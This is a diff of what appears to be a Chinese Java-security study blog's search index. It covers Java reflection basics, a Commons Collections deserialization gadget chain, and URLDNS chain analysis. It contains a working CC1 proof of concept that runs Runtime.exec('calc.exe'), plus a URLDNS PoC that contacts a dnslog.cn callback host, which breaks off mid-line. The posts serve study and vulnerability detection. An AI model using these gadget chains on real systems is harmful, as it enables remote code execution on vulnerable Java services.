@@ -727,6 +727,12 @@
 <p>因为不管传入的参数是什么,ConstantTransformer.transform()只会返回ConstantTransformer.iConstant</p>
 <h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">    ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);s</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">    fout.writeObject(o);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化</span></span><br><span class="line">    fin.readObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				AbstractInputCheckedMapDecorator.setValue</span><br><span class="line">					 TransformedMap.checkSetValue()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br><span class="line"></span><br><span class="line">	Requires:</span><br><span class="line">		commons-collections</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
 
 <h1 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h1>]]></content>
@@ -907,6 +913,196 @@
 ]]></content>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CC6</title>
+    <url>/2023/03/22/CC6/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>java反射与URLDNS链</title>
+    <url>/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/</url>
+    <content><![CDATA[<h1 id="一、什么是反射："><a href="#一、什么是反射：" class="headerlink" title="一、什么是反射："></a>一、什么是反射：</h1><p>（1）Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。本质是JVM得到class对象之后，再通过class对象进行反编译，从而获取对象的各种信息。</p>
+<p>（2）Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</p>
+<h1 id="二、反射的原理："><a href="#二、反射的原理：" class="headerlink" title="二、反射的原理："></a>二、反射的原理：</h1><p>下图是类的正常加载过程、反射原理与class对象：</p>
+<p>Class对象的由来是将.class文件读入内存，并为之创建一个Class对象。</p>
+<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2E3NDUyMzM3MDA=,size_16,color_FFFFFF,t_70.png" class="" title="img">
+
+<p>对于类加载机制与双亲委派模型感兴趣的小伙伴可以阅读这篇文章：<a href="https://blog.csdn.net/a745233700/article/details/90232862">https://blog.csdn.net/a745233700/article/details/90232862</a></p>
+<h1 id="三、反射的优缺点："><a href="#三、反射的优缺点：" class="headerlink" title="三、反射的优缺点："></a>三、反射的优缺点：</h1><p>1、优点：在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</p>
+<p>2、缺点：（1）反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</p>
+<p>（2）反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。</p>
+<h1 id="四、反射的用途："><a href="#四、反射的用途：" class="headerlink" title="四、反射的用途："></a>四、反射的用途：</h1><p>1、反编译：.class–&gt;.java</p>
+<p>2、通过反射机制访问java对象的属性，方法，构造方法等</p>
+<p>3、当我们在使用IDE,比如Ecplise时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。</p>
+<p>4、反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。</p>
+<p>5、例如，在使用Strut2框架的开发过程中，我们一般会在struts.xml里去配置Action，比如</p>
+<action name="login" class="org.ScZyhSoft.test.action.SimpleLoginAction" method="execute">   
+    <result>/shop/shop-index.jsp</result>           
+    <result name="error">login.jsp</result>       
+</action>
+比如我们请求login.action时，那么StrutsPrepareAndExecuteFilter就会去解析struts.xml文件，从action中查找出name为login的Action，并根据class属性创建SimpleLoginAction实例，并用Invoke方法来调用execute方法，这个过程离不开反射。配置文件与Action建立了一种映射关系，当View层发出请求时，请求会被StrutsPrepareAndExecuteFilter拦截，然后StrutsPrepareAndExecuteFilter会去动态地创建Action实例。
+
+<p>比如，加载数据库驱动的，用到的也是反射。</p>
+<p>Class.forName(“com.mysql.jdbc.Driver”); &#x2F;&#x2F; 动态加载mysql驱动</p>
+<h1 id="五、反射机制常用的类："><a href="#五、反射机制常用的类：" class="headerlink" title="五、反射机制常用的类："></a>五、反射机制常用的类：</h1><p>Java.lang.Class;</p>
+<p>Java.lang.reflect.Constructor;</p>
+<p>Java.lang.reflect.Field;</p>
+<p>Java.lang.reflect.Method;</p>
+<p>Java.lang.reflect.Modifier;</p>
+<h1 id="六、反射的基本使用："><a href="#六、反射的基本使用：" class="headerlink" title="六、反射的基本使用："></a>六、反射的基本使用：</h1><p>1、获得Class：主要有三种方法：</p>
+<p>（1）Object–&gt;getClass</p>
+<p>（2）任何数据类型（包括基本的数据类型）都有一个“静态”的class属性</p>
+<p>（3）通过class类的静态方法：forName(String className)（最常用）</p>
+<h2 id="Java-lang-reflect-Constructor"><a href="#Java-lang-reflect-Constructor" class="headerlink" title="Java.lang.reflect.Constructor;"></a>Java.lang.reflect.Constructor;</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getConstructor(<span class="string">&quot;构造方法的类别&quot;</span>....)</span><br><span class="line">newInstance(<span class="string">&quot;可以加上自己构造的class&quot;</span>....)</span><br><span class="line"><span class="comment">//获取String的Class对象</span></span><br><span class="line">Class&lt;?&gt; str = String.class;</span><br><span class="line"><span class="comment">//通过Class对象获取指定的Constructor构造器对象</span></span><br><span class="line">Constructor constructor=c.getConstructor(String.class);</span><br><span class="line"><span class="comment">//根据构造器创建实例：</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(“hello reflection”);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance(); <span class="comment">//User obj =new User();</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Java-lang-reflect-Field"><a href="#Java-lang-reflect-Field" class="headerlink" title="Java.lang.reflect.Field"></a>Java.lang.reflect.Field</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">fb</span> <span class="operator">=</span> cls.getField(<span class="string">&quot;参数名&quot;</span>) 获取公有字段并调用</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span>cls.getDeclaredField(<span class="string">&quot;参数名&quot;</span>)获取私有字段</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">f.set(obj,<span class="string">&quot;参数值&quot;</span>)；</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filed</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;************获取所有公有的字段********************&quot;</span>);</span><br><span class="line">        Field[] fieldArray = cls.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f : fieldArray)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fb</span> <span class="operator">=</span> cls.getField(<span class="string">&quot;age&quot;</span>); <span class="comment">//获取公有字段**并调用</span></span><br><span class="line">        <span class="comment">//获取一个对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance(); <span class="comment">//User obj =new User();</span></span><br><span class="line">        User U=(User)obj;</span><br><span class="line">        fb.set(obj,<span class="number">100</span>);</span><br><span class="line">        System.out.println(U.age);<span class="comment">//public</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span>cls.getDeclaredField(<span class="string">&quot;name&quot;</span>);  <span class="comment">//获取私有字段**并调用</span></span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">        <span class="comment">//为字段设置值</span></span><br><span class="line">        f.set(obj,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        System.out.println(U.getName());</span><br><span class="line"></span><br><span class="line">        f = cls.getDeclaredField(<span class="string">&quot;phoneNum&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">        f.set(obj, <span class="string">&quot;18888889999&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;验证电话：&quot;</span> + U);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Java-lang-reflect-Method"><a href="#Java-lang-reflect-Method" class="headerlink" title="Java.lang.reflect.Method;"></a>Java.lang.reflect.Method;</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span>getMethod(<span class="string">&quot;方法名&quot;</span>,方法的参数类型) 返回一个Method对象</span><br><span class="line">如果是私有方法使用getDeclaredMethod</span><br><span class="line"><span class="title function_">invoke</span><span class="params">(obj，<span class="string">&quot;args1&quot;</span>,<span class="string">&quot;args2&quot;</span>...)</span> 并且可以有返回值</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Methods</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有的方法，包括私有的</span></span><br><span class="line">       Method[] methodArray = cls.getDeclaredMethods();</span><br><span class="line">       <span class="keyword">for</span>(Method m : methodArray)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;show1&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个Student对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance();</span><br><span class="line">        m.invoke(obj, <span class="string">&quot;刘德华&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        m = cls.getDeclaredMethod(<span class="string">&quot;show4&quot;</span>, <span class="type">int</span>.class);<span class="comment">//获取私有的方法</span></span><br><span class="line"></span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);<span class="comment">//解除私有限定</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> m.invoke(obj, <span class="number">20</span>);<span class="comment">//需要两个参数，一个是要调用的对象（获取有反射），一个是实参</span></span><br><span class="line">        System.out.println(<span class="string">&quot;返回值：&quot;</span> + result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="反射main方法："><a href="#反射main方法：" class="headerlink" title="反射main方法："></a>反射main方法：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;main方法执行了。。。&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Student类的main方法、不要与当前的main方法搞混了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">//1、获取Student对象的字节码</span></span><br><span class="line">			<span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;fanshe.main.Student&quot;</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//2、获取main方法</span></span><br><span class="line">			 <span class="type">Method</span> <span class="variable">methodMain</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;main&quot;</span>, String[].class);<span class="comment">//第一个参数：方法名称，第二个参数：方法形参的类型，</span></span><br><span class="line">			<span class="comment">//3、调用main方法</span></span><br><span class="line">			<span class="comment">// methodMain.invoke(null, new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;);</span></span><br><span class="line">			 <span class="comment">//第一个参数，对象类型，因为方法是static静态的，所以为null可以，第二个参数是String数组，这里要注意在jdk1.4时是数组，jdk1.5之后是可变参数</span></span><br><span class="line">			 <span class="comment">//这里拆的时候将  new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125; 拆成3个对象。。。所以需要将它强转。</span></span><br><span class="line">			 methodMain.invoke(<span class="literal">null</span>, (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>&#125;);<span class="comment">//方式一</span></span><br><span class="line">			<span class="comment">// methodMain.invoke(null, new Object[]&#123;new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;&#125;);//方式二			</span></span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用反射创建数值"><a href="#利用反射创建数值" class="headerlink" title="利用反射创建数值"></a>利用反射创建数值</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testArray</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">array</span> <span class="operator">=</span> Array.newInstance(cls,<span class="number">25</span>);</span><br><span class="line">        <span class="comment">//往数组里添加内容</span></span><br><span class="line">        Array.set(array,<span class="number">0</span>,<span class="string">&quot;golang&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">1</span>,<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">2</span>,<span class="string">&quot;pytho&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">3</span>,<span class="string">&quot;Scala&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">4</span>,<span class="string">&quot;Clojure&quot;</span>);</span><br><span class="line">        <span class="comment">//获取某一项的内容</span></span><br><span class="line">        System.out.println(Array.get(array,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="反射修改被final关键字修饰的成员变量"><a href="#反射修改被final关键字修饰的成员变量" class="headerlink" title="反射修改被final关键字修饰的成员变量"></a>反射修改被<code>final</code>关键字修饰的成员变量</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射获取Field类的modifiers</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置modifiers修改权限</span></span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量的Field对象的modifiers值</span></span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量值</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure>
+
+<p>因此我们这里给一个具体实例</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;bcell.Test&quot;</span>);</span><br><span class="line"><span class="type">Test</span> <span class="variable">Test</span> <span class="operator">=</span> (Test) aClass.newInstance();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;TEST&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiers.setInt(field,field.getModifiers()&amp;~Modifier.FINAL);<span class="comment">//fianl标志位置0</span></span><br><span class="line">field.set(Test,<span class="string">&quot;wocao&quot;</span>);</span><br><span class="line">System.out.println(field.get(Test));</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>但是虽然这么多，其中较为重要的⽅法：</p>
+<p>获取类的⽅法： forName</p>
+<p>实例化类对象的⽅法： newInstance</p>
+<p>获取函数的⽅法： getMethod</p>
+<p>执⾏函数的⽅法： invoke</p>
+<h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><p><code>URLDNS</code>是<code>ysoserial</code>中的一条利用链，通常用于检测是否存在<code>Java</code>反序列化漏洞</p>
+<p>[1] URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用</p>
+<p>[2] 不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求 </p>
+<p>[3] 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote>
+<p><code>java.util.HashMap</code>实现了<code>Serializable</code>接口，重写了<code>readObject</code>, 在反序列化时会调用<code>hash</code>函数计算<code>key</code>的<code>hashCode</code>，而<code>java.net.URL</code>的<code>hashCode</code>在计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求</p>
+</blockquote>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><blockquote>
+<p>这里跟着<code>ysoserial</code>项目中<code>URLDNS</code>的<code>Gadget</code>来分析</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">    URL.hashCode()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="0x01-HashMap-readObject"><a href="#0x01-HashMap-readObject" class="headerlink" title="0x01  HashMap.readObject()"></a>0x01  HashMap.readObject()</h2><p>首先 HashMap.readObject()可以被反序列化</p>
+<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322202903247.png" class="" title="image-20230322202903247">
+
+<h2 id="0x02putval"><a href="#0x02putval" class="headerlink" title="0x02putval()"></a>0x02putval()</h2><p>查看readObject，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数</p>
+<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322203334018.png" class="" title="image-20230322203334018">
+
+<h2 id="0x03hash"><a href="#0x03hash" class="headerlink" title="0x03hash()"></a>0x03hash()</h2><p>来到hash()函数,当<code>key!=null</code>时会调用<code>hashCode()</code>函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">      <span class="type">int</span> h;</span><br><span class="line">      <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04hashCode"><a href="#0x04hashCode" class="headerlink" title="0x04hashCode()"></a>0x04hashCode()</h2><p>跟进<code>hashCode()</code>函数，由于在<code>ysoserial</code>中的<code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this)</code>;</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05URLStreamHandler"><a href="#0x05URLStreamHandler" class="headerlink" title="0x05URLStreamHandler"></a>0x05URLStreamHandler</h2><p>调试跟进<code>java/net/URLStreamHandler.java</code>中的<code>hashCode()</code>函数，可以看到这里调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code></p>
+<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322205310959.png" class="" title="image-20230322205310959">
+
+
+
+
+
+<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">nowTime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://lttx9f.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span 